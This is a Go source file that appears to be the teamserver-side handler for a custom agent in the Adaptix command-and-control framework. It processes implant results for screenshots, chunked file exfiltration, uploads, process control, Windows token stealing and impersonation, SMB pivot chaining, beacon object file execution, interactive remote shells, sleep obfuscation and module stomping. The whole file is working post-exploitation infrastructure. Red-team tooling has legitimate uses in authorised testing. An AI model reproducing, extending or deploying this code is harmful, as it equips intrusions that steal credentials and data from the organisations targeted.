package main

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"strings"
	"sync/atomic"
	"time"

	adaptix "github.com/Adaptix-Framework/axc2"
)

// handleScreenshotResult parses a 0x81-tagged screenshot payload and calls TsScreenshotAdd.
// Payload: [0x81][note_len(4LE)][note][img_len(4LE)][img_bytes]
// Returns (displayText, clearText, consumed byte count).
func handleScreenshotResult(ts Teamserver, agentId string, data []byte) (string, string, int) {
	if len(data) < 9 {
		return "screenshot: result too short", "", len(data)
	}
	noteLen := int(binary.LittleEndian.Uint32(data[1:5]))
	if 5+noteLen+4 > len(data) {
		return "screenshot: malformed note", "", len(data)
	}
	note := string(data[5 : 5+noteLen])
	imgLen := int(binary.LittleEndian.Uint32(data[5+noteLen : 9+noteLen]))
	if 9+noteLen+imgLen > len(data) {
		return "screenshot: truncated image", "", len(data)
	}
	consumed := 9 + noteLen + imgLen
	img := data[9+noteLen : consumed]

	sanitizedNote := ""
	for _, b := range []byte(note) {
		if b >= 0x20 && b <= 0x7E {
			sanitizedNote += string(rune(b))
		}
	}

	if ts != nil {
		if err := ts.TsScreenshotAdd(agentId, sanitizedNote, img); err != nil {
			naxLogErr("TsScreenshotAdd failed: %v (agentId=%s note=%q imgLen=%d)", err, agentId, sanitizedNote, len(img))
			return fmt.Sprintf("screenshot: server error: %v", err), "", consumed
		}
	}
	naxLogOk("screenshot saved agentId=%s note=%q imgLen=%d", agentId, sanitizedNote, len(img))
	if sanitizedNote == "" {
		return "Screenshot saved", "", consumed
	}
	return fmt.Sprintf("Screenshot saved: %s", sanitizedNote), "", consumed
}

// handleDownloadResult parses a 0x82-tagged download payload and calls TsDownloadAdd/Update/Close.
// Payload: [0x82][name_len(4LE)][name][data_len(4LE)][data_bytes]
// Returns (displayText, clearText, consumed byte count).
// NOTE: this is the legacy single-shot path, kept for BOF-initiated downloads.
func handleDownloadResult(ts Teamserver, agentId string, data []byte) (string, string, int) {
	if len(data) < 9 {
		return "download: result too short", "", len(data)
	}
	nameLen := int(binary.LittleEndian.Uint32(data[1:5]))
	if 5+nameLen+4 > len(data) {
		return "download: malformed filename", "", len(data)
	}
	filename := string(data[5 : 5+nameLen])
	dlLen := int(binary.LittleEndian.Uint32(data[5+nameLen : 9+nameLen]))
	if 9+nameLen+dlLen > len(data) {
		return "download: truncated data", "", len(data)
	}
	consumed := 9 + nameLen + dlLen
	dlData := data[9+nameLen : consumed]
	fileId := fmt.Sprintf("%08x", rand.Uint32())
	if ts != nil {
		addErr := ts.TsDownloadAdd(agentId, fileId, filename, int64(len(dlData)))
		updErr := ts.TsDownloadUpdate(fileId, 1, dlData)
		clsErr := ts.TsDownloadClose(fileId, 3)
		if addErr != nil || updErr != nil || clsErr != nil {
			_ = ts.TsDownloadSave(agentId, fileId, filename, dlData)
		}
	}
	return fmt.Sprintf("Downloaded: %s (%d bytes)", filename, len(dlData)), "", consumed
}

// handleChunkedDownload handles the new chunked download protocol.
// data is the result payload: [sub_cmd(1)][fileId(4LE)][...]
// Returns true if the caller should skip the default TsTaskUpdate path.
func handleChunkedDownload(ts Teamserver, agentId string, taskIdStr string, data []byte) (displayText string, completed bool, skipUpdate bool) {
	if len(data) < 5 {
		return "download: result too short", true, false
	}
	subCmd := data[0]
	fileId := fmt.Sprintf("%08x", binary.LittleEndian.Uint32(data[1:5]))

	switch subCmd {
	case DL_START:
		// [sub(1)][fileId(4LE)][fileSize(4LE)][fname_len(4LE)][fname]
		if len(data) < 13 {
			return "download: START too short", true, false
		}
		fileSize := int64(binary.LittleEndian.Uint32(data[5:9]))
		fnameLen := int(binary.LittleEndian.Uint32(data[9:13]))
		if 13+fnameLen > len(data) {
			return "download: START truncated filename", true, false
		}
		filename := string(data[13 : 13+fnameLen])
		activeDownloads.Store(taskIdStr, true)
		if ts != nil {
			_ = ts.TsDownloadAdd(agentId, fileId, filename, fileSize)
		}
		return fmt.Sprintf("Download started: %s (%d bytes) [fid %s]", filename, fileSize, fileId), false, false

	case DL_CONTINUE:
		// [sub(1)][fileId(4LE)][chunk_data...]
		chunkData := data[5:]
		if ts != nil {
			_ = ts.TsDownloadUpdate(fileId, 1, chunkData)
		}
		return "", false, true

	case DL_FINISH:
		activeDownloads.Delete(taskIdStr)
		if ts != nil {
			_ = ts.TsDownloadClose(fileId, 3)
		}
		return fmt.Sprintf("Download complete [fid %s]", fileId), true, false

	default:
		return fmt.Sprintf("download: unknown sub-command 0x%02x", subCmd), true, false
	}
}

func showUploadProgress(agentId string, taskIdStr string) {
	midRaw, ok := taskMemoryIds.LoadAndDelete(taskIdStr)
	if !ok {
		return
	}
	mid := midRaw.(uint32)
	sessionRaw, ok := activeUploads.Load(mid)
	if !ok {
		return
	}
	session := sessionRaw.(*uploadSession)
	acked := atomic.AddInt32(&session.ChunksAcked, 1)

	if Ts != nil {
		msg := fmt.Sprintf("Upload %s: chunk %d/%d received", session.RemotePath, acked, session.TotalChunks)
		Ts.TsAgentConsoleOutput(agentId, messageSeverityInfo, msg, "", true)
	}

	if int(acked) >= session.TotalChunks {
		session.FileData = nil
		queueUploadTask(session)
	} else {
		queueSaveMemoryChunk(session)
	}
}

func clearUploadProgress(taskIdStr string) (remotePath string, totalSize int) {
	midRaw, ok := taskMemoryIds.LoadAndDelete(taskIdStr)
	if !ok {
		return "", 0
	}
	mid := midRaw.(uint32)
	sessionRaw, ok := activeUploads.LoadAndDelete(mid)
	if !ok {
		return "", 0
	}
	session := sessionRaw.(*uploadSession)
	return session.RemotePath, session.TotalSize
}

func stompLabel(status byte, slotIdx byte) string {
	if status == 0x01 {
		if slotIdx == 0xFF {
			return "[stomp: image-backed (sync)]"
		}
		return fmt.Sprintf("[stomp: image-backed (async slot %d)]", slotIdx)
	}
	return "[stomp: private fallback]"
}

func parseBofOutput(ts Teamserver, agentId string, data []byte) (string, string) {
	var displayParts []string
	clearText := ""
	off := 0
	for off < len(data) {
		switch data[off] {
		case CALLBACK_SCREENSHOT:
			dt, _, n := handleScreenshotResult(ts, agentId, data[off:])
			displayParts = append(displayParts, dt)
			off += n
		case CALLBACK_DOWNLOAD:
			dt, _, n := handleDownloadResult(ts, agentId, data[off:])
			displayParts = append(displayParts, dt)
			off += n
		case 0x00:
			if off+5 <= len(data) {
				tLen := int(binary.LittleEndian.Uint32(data[off+1 : off+5]))
				if off+5+tLen <= len(data) {
					clearText = string(data[off+5 : off+5+tLen])
					displayParts = append(displayParts, fmt.Sprintf("BOF output (%d bytes)", tLen))
					off += 5 + tLen
				} else {
					clearText = string(data[off+5:])
					off = len(data)
				}
			} else {
				off = len(data)
			}
		default:
			clearText = string(data[off:])
			displayParts = append(displayParts, fmt.Sprintf("BOF output (%d bytes)", len(data)-off))
			off = len(data)
		}
	}
	displayText := ""
	if len(displayParts) > 0 {
		displayText = strings.Join(displayParts, "\n")
	}
	return displayText, clearText
}

func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData []byte) error {

	msgType, _, body, err := DecodeFrame(decryptedData)
	if err != nil {
		naxLogErr("ProcessData: DecodeFrame error: %v", err)
		return err
	}
	switch msgType {
	case WireTypeHeartbeat, WireTypeRegister:
		return nil

	case WireTypeResult:
		taskId, status, data, parseErr := DecodeResultBody(body)
		if parseErr != nil {
			naxLogErr("ProcessData: DecodeResultBody error: %v", parseErr)
			return parseErr
		}
		taskIdStr := fmt.Sprintf("%08x", taskId)

		displayText := string(data)
		clearText := ""

		if _, isShell := activeShells.Load(taskIdStr); isShell {
			switch status {
			case JOB_OUTPUT:
				if len(data) == 0 {
					if Ts != nil {
						Ts.TsTerminalConnResume(agentData.Id, taskIdStr, false)
					}
				} else {
					if Ts != nil {
						output := Ts.TsConvertCpToUTF8(string(data), agentData.OemCP)
						Ts.TsTerminalConnData(taskIdStr, []byte(output))
					}
				}
			case JOB_COMPLETE:
				activeShells.Delete(taskIdStr)
				if Ts != nil {
					reason := "Process exited"
					if len(data) >= 4 {
						code := binary.LittleEndian.Uint32(data[0:4])
						if code != 0 {
							reason = fmt.Sprintf("Process exited with code %d", code)
						}
					}
					_ = Ts.TsTerminalConnClose(taskIdStr, reason)
				}
			case JOB_KILLED:
				activeShells.Delete(taskIdStr)
				if Ts != nil {
					_ = Ts.TsTerminalConnClose(taskIdStr, "Terminal stopped")
				}
			}
			return nil
		}

		if _, isJob := activeJobs.Load(taskIdStr); isJob {
			bofStompLabel := ""
			parseData := data
			if (status == JOB_COMPLETE || status == JOB_KILLED) && len(data) >= 2 {
				bofStompLabel = stompLabel(data[0], data[1])
				parseData = data[2:]
			}
			jobDisplay, jobClear := parseBofOutput(Ts, agentData.Id, parseData)
			task := adaptix.TaskData{
				Type:    adaptix.TASK_TYPE_JOB,
				AgentId: agentData.Id,
				TaskId:  taskIdStr,
				Sync:    true,
			}
			switch status {
			case JOB_OUTPUT:
				task.Completed = false
				task.MessageType = messageSeverityInfo
				task.Message = "BOF output"
				task.ClearText = jobClear
				if jobDisplay != "" && jobClear == "" {
					task.Message = jobDisplay
				}
			case JOB_COMPLETE:
				activeJobs.Delete(taskIdStr)
				task.Completed = true
				task.FinishDate = time.Now().Unix()
				task.MessageType = messageSeveritySuccess
				task.Message = "BOF completed"
				task.ClearText = jobClear
				if jobDisplay != "" && jobClear == "" {
					task.Message = jobDisplay
				}
				if bofStompLabel != "" {
					task.Message += "\n" + bofStompLabel
				}
			case JOB_KILLED:
				activeJobs.Delete(taskIdStr)
				task.Completed = true
				task.FinishDate = time.Now().Unix()
				task.MessageType = messageSeverityError
				task.Message = "BOF killed by watchdog/operator"
				if bofStompLabel != "" {
					task.Message += "\n" + bofStompLabel
				}
			default:
				task.Completed = false
				task.MessageType = messageSeverityInfo
				task.Message = fmt.Sprintf("Job status=%d", status)
				task.ClearText = jobClear
			}
			if Ts != nil {
				Ts.TsTaskUpdate(agentData.Id, task)
			}
			return nil
		}

		if taskId == 0 && status == STATUS_TUNNEL && len(data) > 0 {
			processTunnelResult(agentData.Id, data)
			return nil
		}

		if taskId == 0 && len(data) >= 2 {
			// Synthetic pivot result from NaxProcessPivots (taskId=0)
			// Format: type(1) | body
			pivType := data[0]
			switch pivType {
			case 0: // PIV_TYPE_DATA: pivot_id(4) | data_len(4) | child_data
				if len(data) < 9 {
					return nil
				}
				pivotId := fmt.Sprintf("%08x", binary.LittleEndian.Uint32(data[1:5]))
				pivotDataLen := binary.LittleEndian.Uint32(data[5:9])
				if int(pivotDataLen) <= len(data)-9 {
					pivotData := data[9 : 9+pivotDataLen]
					if Ts != nil {
						_, _, childAgentId := Ts.TsGetPivotInfoById(pivotId)
						_ = Ts.TsAgentProcessData(childAgentId, pivotData)
						_ = Ts.TsAgentSetTick(childAgentId, "")
						clearChildMark(childAgentId)
					}
				}
			case 1: // PIV_TYPE_UNLINK: pivot_id(4) | disconnect_type(1)
				if len(data) < 6 {
					return nil
				}
				pivotId := fmt.Sprintf("%08x", binary.LittleEndian.Uint32(data[1:5]))
				pivotDisType := data[5]
				if Ts != nil && pivotDisType != 0 {
					_, parentAgentId, childAgentId := Ts.TsGetPivotInfoById(pivotId)
					_ = Ts.TsPivotDelete(pivotId)
					deletePivotFromStore(pivotId)
					msgParent := fmt.Sprintf("SMB agent disconnected %s", childAgentId)
					msgChild := fmt.Sprintf(" ----- SMB agent disconnected from [%s] ----- ", parentAgentId)
					Ts.TsAgentConsoleOutput(agentData.Id, messageSeveritySuccess, msgParent, "\n", true)
					Ts.TsAgentConsoleOutput(childAgentId, messageSeveritySuccess, msgChild, "\n", true)
				}
			}
			return nil
		}

		if cmdIdRaw, ok := pendingCmdIds.LoadAndDelete(taskIdStr); ok {
			cmdId := cmdIdRaw.(byte)
			switch {
			case status == STATUS_OK && cmdId == CMD_SLEEP && len(data) >= 5:
				sleepMs := binary.LittleEndian.Uint32(data[0:4])
				jitterPct := uint(data[4])
				displayText = string(data[5:])
				if Ts != nil {
					updated := agentData
					updated.Sleep = uint(sleepMs / 1000)
					updated.Jitter = jitterPct
					_ = Ts.TsAgentUpdateData(updated)
				}

			case status == STATUS_OK && cmdId == CMD_LS:
				if len(data) > 1 && data[0] == 0xFF {
					displayText = "Directory tree"
					clearText = string(data[1:])
				} else {
					displayText, clearText = decodeLsResult(data)
				}

			case status == STATUS_OK && cmdId == CMD_PS_LIST:
				displayText, clearText = decodePsListResult(agentData, taskIdStr, data)

			case status == STATUS_OK && cmdId == CMD_PS_KILL && len(data) >= 4:
				killedPid := binary.LittleEndian.Uint32(data[0:4])
				displayText = fmt.Sprintf("Process %d terminated", killedPid)

			case status == STATUS_OK && cmdId == CMD_PS_RUN && len(data) >= 5:
				spawnedPid := binary.LittleEndian.Uint32(data[0:4])
				runFlags := data[4]
				displayText = fmt.Sprintf("Process %d started", spawnedPid)
				if runFlags&0x02 != 0 {
					displayText += " (suspended)"
				}
				if runFlags&0x01 != 0 && len(data) > 5 {
					clearText = string(data[5:])
				}

			case status == STATUS_OK && cmdId == CMD_UPLOAD:
				remotePath, totalSize := clearUploadProgress(taskIdStr)
				if remotePath != "" {
					displayText = fmt.Sprintf("Upload complete: %s (%s)", remotePath, humanSize(totalSize))
				} else {
					displayText = "Upload complete"
				}

			case status == STATUS_OK && cmdId == CMD_CHUNKSIZE && len(data) >= 4:
				newSz := binary.LittleEndian.Uint32(data[0:4])
				displayText = fmt.Sprintf("Download chunk size set to %s", humanSize(int(newSz)))

			case status == STATUS_OK && cmdId == CMD_RM:
				displayText = "File deleted"

			case cmdId == CMD_PROFILE:
				pendingProfiles.Delete(agentData.Id)
				if status == STATUS_OK {
					displayText = "Profile updated - agent will use new profile on next heartbeat"
				} else {
					removeProfileFromStore(agentData.Id)
					displayText = "Profile update failed on agent"
				}

			case status == STATUS_OK && cmdId == CMD_TOKEN_GETUID:
				displayText, clearText = decodeTokenGetUidResult(data)

			case status == STATUS_OK && cmdId == CMD_TOKEN_STEAL:
				displayText, clearText = decodeTokenStealResult(data)
				if Ts != nil && len(data) >= 8 {
					user, c := readLenPrefixedStringGo(data, 4)
					domain, c := readLenPrefixedStringGo(data, c)
					impFlag := byte(0)
					if c < len(data) {
						impFlag = data[c]
					}
					if impFlag != 0 {
						imp := domain + "\\" + user + " *"
						_ = Ts.TsAgentUpdateDataPartial(agentData.Id, struct {
							Impersonated *string `json:"impersonated"`
						}{Impersonated: &imp})
					}
				}

			case status == STATUS_OK && cmdId == CMD_TOKEN_USE:
				if len(data) >= 4 {
					user, c := readLenPrefixedStringGo(data, 0)
					domain, _ := readLenPrefixedStringGo(data, c)
					imp := domain + "\\" + user + " *"
					displayText = fmt.Sprintf("Impersonating %s", imp)
					if Ts != nil {
						_ = Ts.TsAgentUpdateDataPartial(agentData.Id, struct {
							Impersonated *string `json:"impersonated"`
						}{Impersonated: &imp})
					}
				} else {
					displayText = "Token impersonation active"
				}

			case status == STATUS_OK && cmdId == CMD_TOKEN_LIST:
				displayText, clearText = decodeTokenListResult(data)

			case status == STATUS_OK && cmdId == CMD_TOKEN_RM:
				displayText = "Token removed"

			case status == STATUS_OK && cmdId == CMD_TOKEN_REVERT:
				displayText = "Reverted to self"
				if Ts != nil {
					empty := ""
					_ = Ts.TsAgentUpdateDataPartial(agentData.Id, struct {
						Impersonated *string `json:"impersonated"`
					}{Impersonated: &empty})
				}

			case status == STATUS_OK && cmdId == CMD_TOKEN_MAKE:
				displayText, clearText = decodeTokenMakeResult(data)
				if Ts != nil && len(data) >= 8 {
					user, c := readLenPrefixedStringGo(data, 4)
					domain, _ := readLenPrefixedStringGo(data, c)
					imp := domain + "\\" + user + " *"
					_ = Ts.TsAgentUpdateDataPartial(agentData.Id, struct {
						Impersonated *string `json:"impersonated"`
					}{Impersonated: &imp})
				}

			case status == STATUS_OK && cmdId == CMD_TOKEN_PRIVS:
				displayText, clearText = decodeTokenPrivsResult(data)

			case status == STATUS_ERR && (cmdId == CMD_TOKEN_GETUID || cmdId == CMD_TOKEN_STEAL || cmdId == CMD_TOKEN_USE || cmdId == CMD_TOKEN_LIST || cmdId == CMD_TOKEN_RM || cmdId == CMD_TOKEN_REVERT || cmdId == CMD_TOKEN_MAKE || cmdId == CMD_TOKEN_PRIVS):
				if len(data) >= 4 {
					errCode := binary.LittleEndian.Uint32(data[0:4])
					displayText = fmt.Sprintf("Token command failed: %s (error %d)", win32ErrorName(errCode), errCode)
				} else {
					displayText = "Token command failed"
				}

			case cmdId == CMD_LINK && status == STATUS_OK && len(data) >= 5:
				linkType := data[0]
				watermark := fmt.Sprintf("%08x", binary.LittleEndian.Uint32(data[1:5]))
				beat := data[5:]
				naxLogInfo("CMD_LINK: parent=%s linkType=%d wm=%s beatLen=%d", agentData.Id, linkType, watermark, len(beat))
				if len(beat) >= 16 {
					naxLogInfo("CMD_LINK: beat sessionId=%s cipherLen=%d", string(beat[:16]), len(beat)-16)
				}
				if Ts != nil {
					childAgentId, linkErr := Ts.TsListenerInteralHandler(watermark, beat)
					if linkErr != nil {
						naxLogErr("CMD_LINK: TsListenerInteralHandler wm=%s: %v", watermark, linkErr)
					}
					if childAgentId != "" {
						_ = Ts.TsPivotCreate(taskIdStr, agentData.Id, childAgentId, "", false)
						savePivotToStore(taskIdStr, agentData.Id, childAgentId)
						emptyMark := ""
						_ = Ts.TsAgentUpdateDataPartial(childAgentId, struct {
							Mark *string `json:"mark"`
						}{Mark: &emptyMark})
						if linkType == 1 {
							displayText = fmt.Sprintf("----- New SMB pivot agent: [%s]===[%s] (pivot: %s) -----", agentData.Id, childAgentId, taskIdStr)
							Ts.TsAgentConsoleOutput(childAgentId, messageSeveritySuccess, displayText, "\n", true)
						}
					} else {
						displayText = "link failed: listener returned empty agent ID"
					}
				}

			case cmdId == CMD_UNLINK && len(data) >= 5:
				pivotId := fmt.Sprintf("%08x", binary.LittleEndian.Uint32(data[0:4]))
				pivotType := data[4]
				if Ts != nil {
					_, parentAgentId, childAgentId := Ts.TsGetPivotInfoById(pivotId)
					if pivotType != 0 {
						_ = Ts.TsPivotDelete(pivotId)
						deletePivotFromStore(pivotId)
						msgParent := fmt.Sprintf("SMB agent disconnected %s", childAgentId)
						msgChild := fmt.Sprintf(" ----- SMB agent disconnected from [%s] ----- ", parentAgentId)
						displayText = msgParent
						Ts.TsAgentConsoleOutput(childAgentId, messageSeveritySuccess, msgChild, "\n", true)
					} else {
						displayText = fmt.Sprintf("unlink %s: pivot not found", pivotId)
					}
				}

			case cmdId == CMD_PIVOT_EXEC && len(data) >= 8:
				pivotId := fmt.Sprintf("%08x", binary.LittleEndian.Uint32(data[0:4]))
				pivotDataLen := binary.LittleEndian.Uint32(data[4:8])
				if int(pivotDataLen) <= len(data)-8 {
					pivotData := data[8 : 8+pivotDataLen]
					if Ts != nil {
						_, _, childAgentId := Ts.TsGetPivotInfoById(pivotId)
						_ = Ts.TsAgentProcessData(childAgentId, pivotData)
						_ = Ts.TsAgentSetTick(childAgentId, "")
						clearChildMark(childAgentId)
					}
				}
				return nil

			case cmdId == CMD_BOF && status == STATUS_ASYNC:
				activeJobs.Store(taskIdStr, true)
				task := adaptix.TaskData{
					Type:        adaptix.TASK_TYPE_JOB,
					AgentId:     agentData.Id,
					TaskId:      taskIdStr,
					Completed:   false,
					Sync:        true,
					MessageType: messageSeverityInfo,
					Message:     "BOF queued for async execution",
				}
				if Ts != nil {
					Ts.TsTaskUpdate(agentData.Id, task)
				}
				return nil

			case cmdId == CMD_DOWNLOAD && status == STATUS_OK && len(data) > 0:
				dlDisplay, dlCompleted, dlSkip := handleChunkedDownload(Ts, agentData.Id, taskIdStr, data)
				if dlSkip {
					return nil
				}
				displayText = dlDisplay
				if !dlCompleted {
					task := adaptix.TaskData{
						Type:        taskTypeTask,
						AgentId:     agentData.Id,
						TaskId:      taskIdStr,
						Completed:   false,
						Sync:        true,
						MessageType: messageSeverityInfo,
						Message:     displayText,
					}
					if Ts != nil {
						Ts.TsTaskUpdate(agentData.Id, task)
					}
					return nil
				}

			case cmdId == CMD_SAVEMEMORY:
				showUploadProgress(agentData.Id, taskIdStr)
				return nil

			case cmdId == CMD_BOF || cmdId == CMD_SCREENSHOT:
				if status == STATUS_OK && len(data) > 0 {
					bofStompLabel := ""
					parseData := data
					if len(data) >= 2 {
						bofStompLabel = stompLabel(data[0], data[1])
						parseData = data[2:]
					}
					displayText, clearText = parseBofOutput(Ts, agentData.Id, parseData)
					if displayText == "" {
						displayText = fmt.Sprintf("BOF output (%d bytes)", len(parseData))
					}
					if bofStompLabel != "" {
						displayText += "\n" + bofStompLabel
					}
				} else if status == STATUS_OK {
					switch cmdId {
					case CMD_SCREENSHOT:
						displayText = "screenshot failed (no data)"
					default:
						displayText = "BOF completed (no output)"
					}
				}

			case cmdId == CMD_JOB_LIST && status == STATUS_OK && len(data) >= 4:
				count := binary.LittleEndian.Uint32(data[0:4])
				var lines []string
				lines = append(lines, fmt.Sprintf("Active jobs: %d", count))
				lines = append(lines, fmt.Sprintf(" %-10s  %-10s  %s", "Task ID", "State", "Elapsed"))
				lines = append(lines, fmt.Sprintf(" %-10s  %-10s  %s", "-------", "-----", "-------"))
				off := 4
				for i := uint32(0); i < count && off+9 <= len(data); i++ {
					tid := binary.LittleEndian.Uint32(data[off : off+4])
					state := data[off+4]
					elapsed := binary.LittleEndian.Uint32(data[off+5 : off+9])
					stateStr := "unknown"
					switch state {
					case 0:
						stateStr = "pending"
					case 1:
						stateStr = "running"
					case 2:
						stateStr = "finished"
					case 3:
						stateStr = "killed"
					case 4:
						stateStr = "abandoned"
					}
					lines = append(lines, fmt.Sprintf(" %08x    %-10s  %ds", tid, stateStr, elapsed))
					off += 9
				}
				displayText = lines[0]
				clearText = strings.Join(lines, "\n")

			case cmdId == CMD_JOB_KILL:
				if status == STATUS_OK {
					displayText = "Job kill signal sent"
				} else {
					displayText = "Job not found"
				}

			case cmdId == CMD_WATCHDOG_SET:
				if status == STATUS_OK && len(data) >= 1 {
					state := map[byte]string{0: "off", 1: "on"}[data[0]]
					displayText = fmt.Sprintf("watchdog %s", state)
				} else {
					displayText = "watchdog: command failed"
				}

			case cmdId == CMD_SLEEPOBF_CONFIG:
				if status == STATUS_OK && len(data) >= 2 {
					onOff := func(b byte) string {
						if b == 1 {
							return "on"
						}
						return "off"
					}
					displayText = fmt.Sprintf("Sleep obfuscation config updated:\n  sleep_obf: %s",
						onOff(data[0]))
				} else {
					displayText = "sleepobf-config: command failed"
				}
			}
		} else if _, isDl := activeDownloads.Load(taskIdStr); isDl && status == STATUS_OK && len(data) > 0 {
			dlDisplay, dlCompleted, dlSkip := handleChunkedDownload(Ts, agentData.Id, taskIdStr, data)
			if dlSkip {
				return nil
			}
			displayText = dlDisplay
			if !dlCompleted {
				task := adaptix.TaskData{
					Type:        taskTypeTask,
					AgentId:     agentData.Id,
					TaskId:      taskIdStr,
					Completed:   false,
					Sync:        true,
					MessageType: messageSeverityInfo,
					Message:     displayText,
				}
				if Ts != nil {
					Ts.TsTaskUpdate(agentData.Id, task)
				}
				return nil
			}
		}

		task := adaptix.TaskData{
			Type:       taskTypeTask,
			AgentId:    agentData.Id,
			TaskId:     taskIdStr,
			FinishDate: time.Now().Unix(),
			Completed:  true,
			Sync:       true,
		}
		if status == STATUS_OK {
			task.MessageType = messageSeveritySuccess
			task.Message = displayText
			if clearText != "" {
				task.ClearText = clearText
			}
		} else {
			errMsg := fmt.Sprintf("command failed (status=%d)", status)
			if len(data) == 4 {
				code := binary.LittleEndian.Uint32(data)
				if code != 0 {
					errMsg = fmt.Sprintf("command failed: Win32 error %d (%s)", code, win32ErrorName(code))
				}
			}
			task.MessageType = messageSeverityError
			task.Message = errMsg
		}
		if Ts != nil {
			Ts.TsTaskUpdate(agentData.Id, task)
		}
		return nil

	default:
		return fmt.Errorf("nonameax: ProcessData: unknown wire type %d", msgType)
	}
}
